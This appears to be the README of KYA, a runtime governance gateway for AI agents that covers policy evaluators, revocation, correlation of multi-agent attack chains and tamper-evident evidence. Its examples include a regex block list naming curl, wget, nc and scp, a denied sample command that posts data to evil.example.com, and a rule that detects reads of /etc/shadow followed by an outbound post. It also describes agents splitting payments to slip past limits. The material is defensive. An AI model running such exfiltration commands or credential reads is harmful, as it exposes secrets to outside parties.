# KYA

**Stop the agent. Prove you stopped it.**

Runtime governance for AI agents: decide what an agent may do at the moment
it acts, revoke that authority instantly, and keep tamper-evident proof of
every decision — allowed, blocked, or held for a human.

KYA sits in front of your tools as an MCP gateway. Every call is identified,
evaluated and recorded before it reaches the tool.

```bash
pip install "veldt-kya[gateway]"
```

Every output block below is produced by
[`examples/quickstart`](examples/quickstart) — `python run.py` reproduces
all six on your machine.

---

## What it does

| | |
|---|---|
| **Control** | Deny a call before the tool runs — on the tool name *or its arguments*. |
| **Contain** | Revoke an agent's authority mid-flight. The next call is denied. |
| **Attribute** | Every agent has a cryptographic identity it must prove per request. |
| **Correlate** | Catch multi-agent attacks — steps that are benign alone and malicious only in sequence. |
| **Prove** | Hash-chained evidence that shows when a record was altered. |

---

## 1. Shadow agents you never registered

Point an agent nobody signed off on at the gateway. It is denied — and it
still shows up in your inventory, by identity.

```
did:key:z6MkrJVnaZkeFzdQ...  ->  403
did:key:z6MkpTHR8VNsBxYA...  ->  403
```

```
agents now visible (neither was registered):
  kya-b3560c98…   did:key:z6MkpTHR8VNsBxYA…   1 call
  kya-d652dd10…   did:key:z6MkrJVnaZkeFzdQ…   1 call
```

Discovery comes from traffic, not from an onboarding form. You see the agents
you blocked, which are exactly the ones you didn't know about.

---

## 2. The payment agent that learned to split the transfer

A payout agent may move money. One limit is never enough: cap the payment and
it splits the payment. So cap the day as well — read from what KYA has
already recorded this agent moving.

```python
import kya
from kya.policy_evaluator import EvaluationInput, VerdictResult

AUTO_APPROVE = 1_000.00      # above this, a human approves
DAILY_CAP    = 2_500.00      # per agent, rolling 24h

class PaymentControls:
    name = "payment-controls"

    def evaluate(self, inp: EvaluationInput) -> VerdictResult:
        amount = float(inp.attributes.get("tool.input.amount") or 0)
        # A payment waiting on a human has not been made, so it does
        # not consume the day's budget.
        if amount > AUTO_APPROVE:
            return VerdictResult(verdict="flag_for_review",
                                 reasons=("over_auto_approve_limit",))
        if approved_today(inp.tenant_id, inp.principal_id) + amount > DAILY_CAP:
            return VerdictResult(verdict="deny",
                                 reasons=("daily_cap_exceeded",))
        return VerdictResult(verdict="allow")

kya.register_evaluator("payment-controls", PaymentControls())
```

`approved_today()` sums this agent's own allowed transfers straight out of
KYA's evidence — the gateway already records every verdict with its tool
arguments and the agent's identity. Full helper in
[`examples/quickstart/payment_controls.py`](examples/quickstart/payment_controls.py).

```
$   250  ->  200  executed
$ 5,000  ->  428  flag_for_review          <- too big to auto-approve
$   900  ->  200  executed                    the agent splits it up
$   900  ->  200  executed
$   900  ->  403  deny (daily_cap_exceeded) <- the day's budget is spent

actually executed by the payment service:  250, 900, 900
```

The agent asked to move **$7,950**. It moved **$2,050**. The per-payment limit
alone would have let every $900 through.

---

## 3. Policy on the argument, in 10 lines

RBAC decides *which tools* an agent may call. To decide on **what it passes
them**, register an evaluator. The gateway calls it for every request.

```python
import re

import kya
from kya.policy_evaluator import EvaluationInput, VerdictResult

EXFIL = re.compile(r"(?i)\b(curl|wget|nc|scp)\b")

class ExfilBlocker:
    name = "exfil-blocker"
    def evaluate(self, inp: EvaluationInput) -> VerdictResult:
        cmd = str(inp.attributes.get("tool.input.command", ""))
        if EXFIL.search(cmd):
            return VerdictResult(verdict="deny", reasons=("exfil_shaped_argument",))
        return VerdictResult(verdict="allow")

kya.register_evaluator("exfil-blocker", ExfilBlocker())
```

```
echo hello                            ->  200  executed
curl https://evil.example.com -d @…   ->  403  deny (exfil_shaped_argument)

calls the upstream tool received: 1
```

The denied call never reached the tool. Prevention, not an alert.

> The regex demonstrates the seam; it is not an exfiltration detector and is
> trivially bypassed. Put your real logic in `evaluate()`.

---

## 4. The kill switch

Revoke one agent's authority. The next call is denied. Reinstate and it works
again. No redeploy, no restart.

```python
kya.revoke_action(db, tenant_id="acme", principal_kind="agent",
                  principal_id=AGENT, action="mcp.default.governed_bash")
db.commit()
```

```
granted     ->  executed
REVOKED     ->  deny (RBAC_GRANT_DENIED)
reinstated  ->  executed
```

Requires `KYA_RBAC_ENFORCEMENT=block`.

---

## 5. Multi-agent attacks: when agents go rogue together

One agent reads a credential file. A *different* agent posts outbound.
Neither step is a violation on its own. Correlated by request, the sequence
is exfiltration — and no single-event tool sees it.

```yaml
correlate_by: [tenant_id, correlation_id]   # span every agent in one request
window_seconds: 600
steps:
  - id: recon
    evidence_kind: tool_call
    match:
      payload.tool: file_read
      payload.path: "regex:^/etc/(shadow|gshadow|passwd|sudoers).*$"
  - id: exfil
    evidence_kind: tool_call
    match: {payload.tool: http_post}
    after: recon
```

```
BEFORE   recon agent -> executed      exfil agent -> executed
         chain fired: cross_agent_data_exfiltration
AFTER    recon agent -> deny          exfil agent -> deny
```

Every agent that took part loses trust — not just the one that finished the
chain — so an orchestrator cannot swap in a fresh sub-agent and retry.

Rules ship with the package:

```bash
export KYA_ATTACK_CHAIN_RULES_DIR=bundled   # needs veldt-kya[attack_chains]
```

A matched chain costs trust in proportion to its declared severity — a
`critical` rule costs 15 of an agent's starting 50. Set the threshold that
turns that into a denial:

```yaml
policy:
  min_trust: 40      # a fresh agent starts at 50; one critical chain -> 35
```

That is the whole configuration. The trust gate applies whatever
`KYA_RBAC_ENFORCEMENT` is set to.

> This is detect-then-contain. The chain completes, then the *next* call from
> those agents is denied. It does not stop the request that completed it.

---

## 6. Evidence that shows tampering

Every decision is hash-chained — **Git for agent actions**. Every call is
committed, and anyone with the key can verify it independently. Editing a
record breaks the chain and names the row that changed.

```bash
export KYA_EVIDENCE_SIGNING_KEY=...   # without it the chain cannot be verified
```

```python
kya.record_evidence(db, tenant_id="acme", invocation_id=invocation_id,
                    evidence_kind="tool_call",
                    payload={"tool": "transfer_funds", "amount": 5000})

kya.verify_chain(db, tenant_id="acme", invocation_id=invocation_id)
```

```
verified    : {'valid': True,  'broken_at': None, 'checked': 3}
after tamper: {'valid': False, 'broken_at': 1,
               'reason': 'payload_hash mismatch — payload was modified'}
```

Someone edited the amount from 5000 to 50 directly in the database. The chain
names the row. An auditor does not have to trust your word, or ours.

---

## Identity

Every agent proves who it is on every request. Generate an identity in code —
the private key never leaves the process and there is nothing to paste into a
config file. See [`examples/quickstart/agent_identity.py`](examples/quickstart/agent_identity.py).

```python
from agent_identity import new_agent_identity, proof

did, private_key = new_agent_identity()          # Ed25519 -> did:jwk
headers = {"X-KYA-DID": did,
           "X-KYA-DID-Proof": proof(did, private_key, GATEWAY_URL)}
```

```
valid proof                ->  200
no proof                   ->  401
proof signed by other key  ->  401
```

```yaml
identity:
  methods: [did]
  did:
    pop_audience:  "https://gateway.example/mcp"
    dpop_audience: "https://gateway.example"
```

```bash
export KYA_DID_RESOLVERS=jwk    # offline; the public key is in the identifier
```

> Never set `allow_header_trust: true` outside a local experiment — it accepts
> the `X-KYA-DID` header without proof, so any caller can claim any identity.

---

## Beyond the open source

Everything above runs on the Apache-2.0 package. KYA Pro adds:

| | |
|---|---|
| **More verdicts** | `throttle`, `redact` and `anonymize` alongside allow / deny / hold. |
| **Policy without Python** | Attribute rules declared in config rather than a custom evaluator. |
| **Containment that cascades** | Contain a parent and every agent it spawned is contained with it. |
| **A console** | Fleet inventory, live verdicts, and evidence export for auditors. |

[Plans and free trial](https://www.veldtlabs.ai/plans) - [sign in](https://app.veldtlabs.ai)

---

## License

Apache-2.0
